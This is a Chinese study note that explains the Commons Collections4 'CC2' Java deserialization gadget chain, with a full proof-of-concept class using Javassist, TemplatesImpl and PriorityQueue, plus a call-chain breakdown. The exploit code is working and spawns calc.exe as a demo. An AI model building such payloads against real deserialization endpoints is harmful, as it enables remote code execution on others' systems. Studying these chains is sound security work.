---
title: CC2链
date: 2026-03-25
updated: 2026-03-25
tags:
  - 链子
categories:
  - 链子
description: CC2链
published: true
---
```xml
<dependencies>
	<dependency>
		<groupId>org.apache.commons</groupId>
		<artifactId>commons-collections4</artifactId>
		<version>4.0</version>
	</dependency>
	<dependency>
		<groupId>org.javassist</groupId>
		<artifactId>javassist</artifactId>
		<version>3.28.0-GA</version>
	</dependency>
</dependencies>
```

> `3.1-3.2.1` 版本中 `TransformingComparator` 并没有去实现 `Serializable` 接口

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2Exp {

    public static void main(String[] args) throws Exception {

        // 利用 Javassist 动态生成恶意类的字节码 (木马)
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilClass");

        // TemplatesImpl 要求加载的类必须继承自 AbstractTranslet
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        // 在无参构造函数中插入恶意代码
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
        constructor.setBody("{ java.lang.Runtime.getRuntime().exec(\"calc.exe\"); }");
        ctClass.addConstructor(constructor);

        // 获取生成的字节码
        byte[] bytecodes = ctClass.toBytecode();

        // 构造 TemplatesImpl 实例，注入恶意字节码
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytecodes});
        setFieldValue(templates, "_name", "EvilTemplates");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 构造 InvokerTransformer (核心触发点)
        // 注意避坑：在构造阶段，我们先给一个无害的方法名（比如 toString）
        // 如果这里直接写 newTransformer，在下一步往队列里添加元素时就会提前引爆！
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // 构造 TransformingComparator (连接 PriorityQueue 和 Transformer)
        TransformingComparator comparator = new TransformingComparator(transformer);

        // 构造 PriorityQueue
        // 指定队列大小为 2，并传入我们构造的恶意比较器
        PriorityQueue queue = new PriorityQueue(2, comparator);

        // 往队列里添加两个 templates 对象
        // 添加时会触发一次排序，由于我们前面把 transformer 设置为了 "toString"，所以这里很安全
        queue.add(templates);
        queue.add(templates);

        // 偷天换日 (最精髓的一步)
        // 队列构造完毕后，利用反射，把 InvokerTransformer 里面无害的 "toString"
        // 悄悄替换成真正致命的 "newTransformer"
        // 这样在反序列化时，就会按照我们的剧本去执行了
        setFieldValue(transformer, "iMethodName", "newTransformer");


        byte[] serializedQueue = serialize(queue);
        System.out.println("CC2 恶意对象序列化完成...");

        // readObject -> heapify -> siftDownUsingComparator -> compare -> transform -> newTransformer
        unserialize(serializedQueue);
    }

    // 通过反射设置私有字段的值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void unserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

![[attachments/20260328103104.png]]

![[attachments/20260328103226.png]]

这里的 comparator 就是构造的 TransformingComparator 实例

![[attachments/20260328103258.png]]

![[attachments/20260328103507.png]]

这里的 transformer 就是构造的 InvokerTransformer 实例

![[attachments/20260328103624.png]]

通过反射调用指定方法

iMethodName 已经被反射修改为 newTransformer，所以会调用 `templates.newTransformer()`

![[attachments/20260328103932.png]]

`TemplatesImpl` JDK 自带处理 XML 转换类，可将包含 java 字节码的字节数组加载为真正的 Java 类，并实例化它。可将恶意代码编译为字节码，塞进 `TemplatesImpl` 的私有属性 `_bytecodes` 中。

只要调用 `TemplatesImpl.newTransformer()` 则会加载并实例化木马类，从而执行恶意代码。

![[attachments/20260328104021.png]]

![[attachments/20260328104306.png]]

![[attachments/20260328104427.png]]

`_class[0].newInstance()` 被调用，执行通过 Javassist 插入的恶意代码。

> 使用 Javassist 生成恶意类
> 
> TemplatesImpl 的加载机制：`AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();`
> 
> 因为 TemplatesImpl 要求加载的类必须：
> 
> 1. 继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`
> 2. 有一个无参构造函数
> 3. 构造函数中包含恶意代码
> 
> Javassist 可以动态生成满足这些条件的字节码。

利用排序机制触发比较，比较器可自定义传入

```
ois.readObject() <=> ObjectInputStream.readObject()
PriorityQueue::readObject()
	->PriorityQueue::heapify()
	->PriorityQueue::siftDown()
	->PriorityQueue::siftDownUsingComparator()
	->TransformingComparator::compare()
	->InvokerTransformer::transform()
	->TemplatesImpl::newTransformer()          // 加载恶意字节码为 Class
	->MaliciousClass::<init>()                 // 实例化触发代码执行
```